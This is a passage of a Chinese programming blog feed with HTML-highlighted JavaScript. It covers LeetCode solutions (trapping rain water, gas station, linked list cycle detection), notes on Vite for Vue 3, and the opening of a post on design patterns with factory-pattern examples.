punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>输出：<span class="token number">6</span>解释：上面是由数组 <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> 表示的高度图，在这种情况下，可以接 <span class="token number">6</span> 个单位的雨水（蓝色部分表示雨水）。 </code></pre><ul><li>数据结构：单调栈</li><li>当后面的柱子高度比前面的低时，是无法接雨水的，当找到一根比前面高的柱子，就可以计算接到的雨水，所以使用单调递减栈</li><li>当出现高于栈顶的柱子时，说明可以对前面的柱子结算了，计算已经到手的雨水，然后出栈前面更低的柱子</li><li>推荐看这篇题解中的图示：<a href="https://leetcode-cn.com/problems/trapping-rain-water/solution/dan-diao-zhan-jie-jue-jie-yu-shui-wen-ti-by-sweeti/" target="_blank" rel="noopener">单调栈O(n)解决，动图预警🎶🎵</a></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> trap <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>height <span class="token operator">||</span> height<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> height<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> height<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> height<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">let</span> tmp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 此时栈顶元素， 出栈元素，当前元素恰好是一个凹型</span>            res <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>height<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>height<span class="token punctuation">[</span>stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> height<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> stack<span class="token punctuation">[</span>stack<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="加油站"><a href="#加油站" class="headerlink" title="加油站"></a>加油站</h2><ul><li><a href="https://leetcode-cn.com/problems/gas-station/" target="_blank" rel="noopener">leetcode134</a></li></ul><pre class=" language-js"><code class="language-js">输入<span class="token punctuation">:</span> gas  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>cost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>输出<span class="token punctuation">:</span> <span class="token number">3</span>解释<span class="token punctuation">:</span>从 <span class="token number">3</span> <span class="token function">号加油站</span><span class="token punctuation">(</span>索引为 <span class="token number">3</span> 处<span class="token punctuation">)</span>出发，可获得 <span class="token number">4</span> 升汽油。此时油箱有 <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">=</span> <span class="token number">4</span> 升汽油开往 <span class="token number">4</span> 号加油站，此时油箱有 <span class="token number">4</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">=</span> <span class="token number">8</span> 升汽油开往 <span class="token number">0</span> 号加油站，此时油箱有 <span class="token number">8</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">7</span> 升汽油开往 <span class="token number">1</span> 号加油站，此时油箱有 <span class="token number">7</span> <span class="token operator">-</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token number">6</span> 升汽油开往 <span class="token number">2</span> 号加油站，此时油箱有 <span class="token number">6</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">5</span> 升汽油开往 <span class="token number">3</span> 号加油站，你需要消耗 <span class="token number">5</span> 升汽油，正好足够你返回到 <span class="token number">3</span> 号加油站。因此，<span class="token number">3</span> 可为起始索引。</code></pre><h3 id="暴力解法"><a href="#暴力解法" class="headerlink" title="暴力解法"></a>暴力解法</h3><ul><li>首先计算 gas 与 cost 的差值，例如 gas  = [1,2,3,4,5]，cost = [3,4,5,1,2]，sub为 [-2, -2, -2, 3, 3]</li><li>其中 sub[i] &gt; 0  才能作为起始点</li><li>题目就变为找出能作为起点的索引值 i，从 i 开始轮一圈判断剩余油量大于0直到循环一轮结束</li><li>时间复杂度 O(n^2)</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> canCompleteCircuit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>gas<span class="token punctuation">,</span> cost<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> gas<span class="token punctuation">.</span>length    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>gas<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">let</span> count <span class="token operator">=</span> gas<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            <span class="token keyword">let</span> pos <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> n            <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token boolean">true</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>pos <span class="token operator">!==</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                count <span class="token operator">+</span><span class="token operator">=</span> gas<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">-</span> cost<span class="token punctuation">[</span>pos<span class="token punctuation">]</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    flag <span class="token operator">=</span> <span class="token boolean">false</span>                    <span class="token keyword">break</span>                <span class="token punctuation">}</span>                pos <span class="token operator">=</span> <span class="token punctuation">(</span>pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> n            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span> <span class="token keyword">continue</span>            <span class="token keyword">else</span> <span class="token keyword">return</span> i        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span></code></pre><h3 id="优化解法"><a href="#优化解法" class="headerlink" title="优化解法"></a>优化解法</h3><ul><li>首先如果总油量减去总消耗大于等于零那么一定可以跑完一圈，则一定可以找到一个解（即索引i），至于为什么可以参考<a href="https://leetcode-cn.com/problems/gas-station/solution/shou-hua-tu-jie-liang-ge-guan-jian-jie-lun-de-jian/" target="_blank" rel="noopener">这篇题解</a>，如果小于零直接返回 -1</li><li>同样的每个加油站的剩余量sub[i]为gas[i] - cost[i]。</li><li>i从0开始累加sub[i]，和记为curSum，一旦curSum小于零，说明[0, i]区间都不能作为起始位置，因为小于0说明无法到达，这时起始位置从i+1算起，再从0计算curSum。</li><li>那么为什么一旦[i，j] 区间和为负数，起始位置就可以是j+1呢，j+1后面就不会出现负数？因为如果出现更大的负数，就是更新j，那么起始位置又变成新的j+1了。</li><li>时间复杂度 O(n)</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> canCompleteCircuit <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>gas<span class="token punctuation">,</span> cost<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment" spellcheck="true">// 总的剩余油料</span>  <span class="token keyword">let</span> sub <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment" spellcheck="true">// 当前站点的剩余油料</span>  <span class="token keyword">let</span> start <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment" spellcheck="true">// 起始点</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> gas<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    sub <span class="token operator">+</span><span class="token operator">=</span> gas<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sub <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      start <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>      sub <span class="token operator">=</span> <span class="token number">0</span>    <span class="token punctuation">}</span>    total <span class="token operator">+</span><span class="token operator">=</span> gas<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> cost<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> total <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">?</span> start<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span></code></pre><h2 id="环形链表：双指针"><a href="#环形链表：双指针" class="headerlink" title="环形链表：双指针"></a>环形链表：双指针</h2><ul><li><a href="https://leetcode-cn.com/problems/linked-list-cycle/" target="_blank" rel="noopener">leetcode141</a>，类似的题目还有</li><li><a href="https://leetcode-cn.com/problems/container-with-most-water/" target="_blank" rel="noopener">leetcode11：</a>盛最多水的容器</li><li><a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/" target="_blank" rel="noopener">leetcode19</a>：删除链表的倒数第n个结点</li></ul><pre class=" language-js"><code class="language-js">示例 <span class="token number">1</span>：输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos <span class="token operator">=</span> <span class="token number">1</span>输出：<span class="token boolean">true</span>解释：链表中有一个环，其尾部连接到第二个节点。示例 <span class="token number">2</span>：输入：head <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos <span class="token operator">=</span> <span class="token number">0</span>输出：<span class="token boolean">true</span>解释：链表中有一个环，其尾部连接到第一个节点。</code></pre><ul><li>快慢指针法</li><li>快、慢指针，从头节点出发</li><li>慢指针每次走一步，快指针每次走两步，不断比较它们指向的节点的值</li><li>如果节点值相同，说明有环。如果不同，继续循环。</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> hasCycle <span class="token operator">=</span> <span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">let</span> fast <span class="token operator">=</span> head  <span class="token keyword">let</span> slow <span class="token operator">=</span> head  <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next                     fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>                 <span class="token keyword">if</span> <span class="token punctuation">(</span>slow <span class="token operator">==</span> fast<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span>   <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                   <span class="token punctuation">}</span></code></pre><h2 id="环形链表2"><a href="#环形链表2" class="headerlink" title="环形链表2"></a>环形链表2</h2><ul><li><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/" target="_blank" rel="noopener">leetcode142</a></li><li>相比上一题需要找到环形入口，具体可参考题解<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/solution/141ti-de-kuo-zhan-ru-guo-lian-biao-you-huan-ru-he-/" target="_blank" rel="noopener">「手画图解+公式推导」链表有环，如何求入环点？</a></li><li>这种方法自己怎么可能想出来呀。。</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> detectCycle <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> slow <span class="token operator">=</span> head    <span class="token keyword">let</span> fast <span class="token operator">=</span> head    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span>      slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next            fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next        <span class="token keyword">if</span> <span class="token punctuation">(</span>slow <span class="token operator">==</span> fast<span class="token punctuation">)</span> <span class="token punctuation">{</span>              fast <span class="token operator">=</span> head                  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>slow <span class="token operator">==</span> fast<span class="token punctuation">)</span> <span class="token keyword">return</span> slow          slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next          fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next            <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">null</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><strong>注：以上题解还参考了</strong></p><ol><li><p><a href="https://leetcode-cn.com/problems/remove-k-digits/solution/yi-zhao-chi-bian-li-kou-si-dao-ti-ma-ma-zai-ye-b-5/" target="_blank" rel="noopener">一招吃遍力扣四道题，妈妈再也不用担心我被套路啦～</a></p></li><li><p><a href="https://leetcode-cn.com/problems/gas-station/solution/shou-hua-tu-jie-liang-ge-guan-jian-jie-lun-de-jian/" target="_blank" rel="noopener">「图解」为什么总加油&gt;=总油耗就一定有解？简单论证两个关键结论 | 附暴力法</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue3.0（三）</title>
      <link href="2021/01/13/Vue-Vue3.0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>2021/01/13/Vue-Vue3.0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Vite-概念"><a href="#Vite-概念" class="headerlink" title="Vite 概念"></a>Vite 概念</h1><ul><li>Vite 是一个面向现代浏览器的一个更轻，更快的 web 应用开发工具</li><li>它基于 ECMAScript 标准原生模块系统（ES Modules）实现</li><li>主要为了解决开发阶段使用 webpack-dev-server 仍启动过慢，HMR 热更新反应慢</li></ul><h1 id="Vite-项目依赖"><a href="#Vite-项目依赖" class="headerlink" title="Vite 项目依赖"></a>Vite 项目依赖</h1><ul><li>Vite：命令行工具</li><li>@vue/compiler-sfc：编译 .vue 单文件组件，在 vue2 中是 vue=template-compiler</li></ul><h1 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h1><ul><li>vite serve：开启 web 服务器，不需要编译所有文件，启动速度十分快</li><li>vite build<ul><li>Rollup</li><li>Dynamic import<ul><li>Polyfill</li></ul></li></ul></li></ul><h2 id="vite-serve"><a href="#vite-serve" class="headerlink" title="vite serve"></a>vite serve</h2><blockquote><p>只有具体使用模块的时候才会编译，HMR也立即编译当前所修改的文件</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/13/sNcPaV.png" alt="sNcPaV.png"></p><h2 id="vue-cli-serve"><a href="#vue-cli-serve" class="headerlink" title="vue-cli serve"></a>vue-cli serve</h2><blockquote><p>不管模块是否被执行，都会被打包</p><p>HMR：会自动以这个文件为入口重新 build 一次，所有涉及到的依赖也都会被加载一遍</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/13/sN6hgH.png" alt="sN6hgH.png"></p><h2 id="打包-or-不打包"><a href="#打包-or-不打包" class="headerlink" title="打包 or 不打包"></a>打包 or 不打包</h2><p>使用 webpack 打包的两个原因</p><ul><li>浏览器环境并不支持模块化（已渐渐不存在 ）</li><li>零散的模块文件会产生大量的 http 请求</li></ul><h1 id="开箱即用"><a href="#开箱即用" class="headerlink" title="开箱即用"></a>开箱即用</h1><ul><li>TypeScript - 内置支持</li><li>less / sass / stylus / postcss - 内置支持（需要单独安装）</li><li>JSX</li><li>Web Assembly</li></ul><h1 id="Vite-特性"><a href="#Vite-特性" class="headerlink" title="Vite 特性"></a>Vite 特性</h1><ul><li>快速冷启动</li><li>模块热更新</li><li>按需编译</li><li>开箱即用</li></ul>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript设计模式</title>
      <link href="2021/01/08/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>2021/01/08/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>JavaScript 设计模式，设计模式是一种思想，和语言无关。</p><ul><li>开发效率</li><li>可维护性</li></ul><p>相关书籍</p><ul><li>《大话设计模式》</li><li>《设计模式：可服用面向对象软件的基础》</li><li>《headfirst 设计模式》</li><li>《JavaScript 设计模式》</li><li><a href="https://www.bookstack.cn/books/design-pattern-in-javascript?tab=comment" target="_blank" rel="noopener">《JavaScript中的设计模式》</a></li></ul><h1 id="面向对象的-JavaScript"><a href="#面向对象的-JavaScript" class="headerlink" title="面向对象的 JavaScript"></a>面向对象的 JavaScript</h1><ul><li>类</li><li>实例</li><li>构造函数</li><li>继承</li><li>多态</li><li>封装</li><li>原型</li><li>class语法 </li><li>具体看<a href="https://www.jinjingxuan.com/2019/01/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/" target="_blank" rel="noopener">面向对象编程</a></li></ul><h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h1><ul><li>创建型模式<ul><li>工厂模式</li><li>抽象工厂模式</li><li>单例模式</li><li>建造者模式</li><li>原型模式</li></ul></li><li>结构型模式<ul><li>适配器模式</li><li>桥接模式</li><li>过滤器模式</li><li>组合模式</li><li>装饰器模式</li><li>外观模式</li><li>享元模式</li><li>代理模式</li></ul></li><li><p>行为型模式</p><ul><li>责任链模式</li><li>命令模式</li><li>解释器模式</li><li>迭代器模式</li><li>中介者模式</li><li>备忘录模式</li><li>观察者模式</li><li>状态模式</li><li>空对象模式</li><li>策略模式</li><li>模板模式</li><li>访问者模式</li></ul></li><li><p>适配器模式</p></li><li>装饰器模式</li></ul><h2 id="工厂模式-Factory-pattern"><a href="#工厂模式-Factory-pattern" class="headerlink" title="工厂模式(Factory pattern)"></a>工厂模式(Factory pattern)</h2><p>工厂模式是比较常用的设计模式之一，那么什么叫工厂模式呢？简单来说，就是你需要什么东西不直接使用new的方法生成实例，然后统一通过工厂进行生产加工再生成实例。</p><h3 id="工厂模式的实例"><a href="#工厂模式的实例" class="headerlink" title="工厂模式的实例"></a>工厂模式的实例</h3><p>比如我们现在有很多形状比如圆形，矩形和正方形。这类都是属于形状，那我们是不是可以通过专门生产形状的工厂来生成它们的实例么？</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I'm a circle"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Rectangle</span> <span class="token punctuation">{</span>    <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I'm a rectangle"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Square</span> <span class="token punctuation">{</span>    <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"I'm a square"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>那么接下来，我们可以建立一个专门生产形状的工厂来生产它们了。即根据字符串来产生对应需要的类。你在这里可以看到类的出口都已经在一个方法中了。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">ShapeFactory</span> <span class="token punctuation">{</span>    <span class="token function">getShape</span><span class="token punctuation">(</span>shapeType<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>shapeType<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'CIRCLE'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'RECTANGLE'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'SQUARE'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>那么我们需要使用的时候，就可以直接只需要new出一个工厂，在根据字符串就能拿到对应的需要生产的类了。而不需要分别对类进行new。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> shapeFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ShapeFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 通过工厂拿各种形状</span><span class="token keyword">const</span> shape1 <span class="token operator">=</span> shapeFactory<span class="token punctuation">.</span><span class="token function">getShape</span><span class="token punctuation">(</span><span class="token string">'CIRCLE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>shape1<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> shape2 <span class="token operator">=</span> shapeFactory<span class="token punctuation">.</span><span class="token function">getShape</span><span class="token punctuation">(</span><span class="token string">'RECTANGLE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>shape2<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> shape3 <span class="token operator">=</span> shapeFactory<span class="token punctuation">.</span><span class="token function">getShape</span><span class="token punctuation">(</span><span class="token string">'SQUARE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>shape3<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * output: * I'm a circle * I'm a rectangle * I'm a square */</span></code></pre><h3 id="工厂模式的优势"><a href="#工厂模式的优势" class="headerlink" title="工厂模式的优势"></a>工厂模式的优势</h3><p>那么使用工厂模式的好处也是显而易见的，比如实例的生产比较复杂，或者说生成实例后还需要额外加工，这个时候工厂给了我们一个统一的出入口，也方便了日后对这个实例的修改。比如你要修改工厂产出是一个单例的时候，就不需要在所有的类中修改，而只要在工厂出口修改即可达到目标。</p><h2 id="抽象工厂模式-abstract-Factory-Pattern"><a href="#抽象工厂模式-abstract-Factory-Pattern" class="headerlink" title="抽象工厂模式(abstract Factory Pattern)"></a>抽象工厂模式(abstract Factory Pattern)</h2><p>上文讲到了工厂模式，这篇文章将抽象工厂，抽象工厂的名字是真的很抽象，也很容易让人抽象的理解，那么什么是抽象工厂呢？</p><p>其实抽象工厂，简单来说就是工厂的工厂，因为一般来说一个工厂只负责加载一类组件，那么你有很多小类组件需要生产，那么势必会有很多小类的工厂。那么你最终生产一个大类，那就要很多小类的工厂负责生产。那么如何更方便的管理或者说生产这些工厂呢？那就用生产工厂的工厂来生成吧。</p><h3 id="抽象工厂模式的实例"><a href="#抽象工厂模式的实例" class="headerlink" 